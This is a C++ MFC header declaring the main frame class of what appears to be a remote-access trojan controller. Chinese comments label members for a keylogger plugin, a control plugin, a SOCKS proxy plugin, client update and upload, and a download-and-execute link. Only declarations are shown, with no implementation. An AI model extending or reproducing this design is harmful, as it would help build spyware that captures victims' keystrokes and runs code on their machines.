// MainFrm.h : interface of the CMainFrame class
//
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_MAINFRM_H__4920299B_DB96_403A_9D10_9315076E14A7__INCLUDED_)
#define AFX_MAINFRM_H__4920299B_DB96_403A_9D10_9315076E14A7__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "MyClientManaView.h"
#include "MyLogsView.h"
#include "MyTopView.h"
#include "MyBottomView.h"

class CMainFrame : public CFrameWnd
{
	
DECLARE_DYNCREATE(CMainFrame)
public:

	CMainFrame();           // protected constructor used by dynamic creation
	~CMainFrame();

	// Attributes
public:

	//控制插件
	DWORD m_DllSize;
	LPBYTE pDllFileData;
	BYTE m_DllFileMd5[24];

	//键盘记录插件
	DWORD m_KeySize;
	LPBYTE pKeyFileData;
	BYTE m_KeyFileMd5[24];

	//SOCKS插件
	BYTE* pSckFileData;
	DWORD m_SckSize;

/*	//CMD.EXE
	DWORD m_CmdSize;
	LPBYTE pCmdFileData;
*/
	//更新客户端文件
	DWORD nUpdateFileLen;
	BYTE* pUpdateFileData;

	//上传客户端文件
	DWORD nUpLoadFileLen;
	BYTE* pUpLoadFileData;

	//下载执行连接
	DWORD nLinkStrLen;
	BYTE* pLinkStrData;

	//用户显示信息
	DWORD nMessStrLen;
	BYTE* pMessStrData;

	//下载执行连接
	DWORD nDownUrlLen;
	BYTE* pDownUrlData;

	//全局互斥量
	HANDLE hLockFileMutex;

	SOCKET m_Socket;
	BOOL	m_IsProxy;
	HANDLE hExitEvent;

	virtual BOOL StartWork();

// Operations
public:

	void StartMainShowProcess();
	void StartFileDownProcess();

	void static DoNormalListenThread(LPVOID lPvoid);
	void static DoProxyListenThread(LPVOID lPvoid);
		
	void static DoNormalChildWorkThread(LPVOID lPvoid);
	void static DoProxyChildWorkThread(LPVOID lPvoid);

	void DoChildWork(SOCKET s);
	SOCKET static StartTcp(WORD Port);
	SOCKET static GetConnectSocket(char* pServerAddr, UINT nServerPort);
	BOOL GetSysFileData(LPCTSTR pFileName, BYTE** pFileDataBuf, DWORD* pFileDataLen, BYTE* pMd5DataBuf, LPCTSTR pTitle);

	void DownLoadModFile(MyServerTran* pTran);
	void DownLoadKeyFile(MyServerTran* pTran);
	void DoWndTransWork(MyServerTran* pTran);
	void SendMainConnect(MyServerTran* pTran);
	void SendDataToClient(MyServerTran* pTran, DWORD nSendDataLen, BYTE* pSendData);

	void SendLogs(LPCTSTR pText);
	void DisEnableXvidShow();
	void UpdateModFileData(BYTE* pFileData, DWORD nFileLen);

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMainFrame)
	protected:

	//}}AFX_VIRTUAL

// Implementation
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:  // control bar embedded members

	// Generated message map functions
protected:

	//{{AFX_MSG(CMainFrame)
	afx_msg BOOL OnCopyData(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct);
	//}}AFX_MSG

	DECLARE_MESSAGE_MAP()
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MAINFRM_H__4920299B_DB96_403A_9D10_9315076E14A7__INCLUDED_)
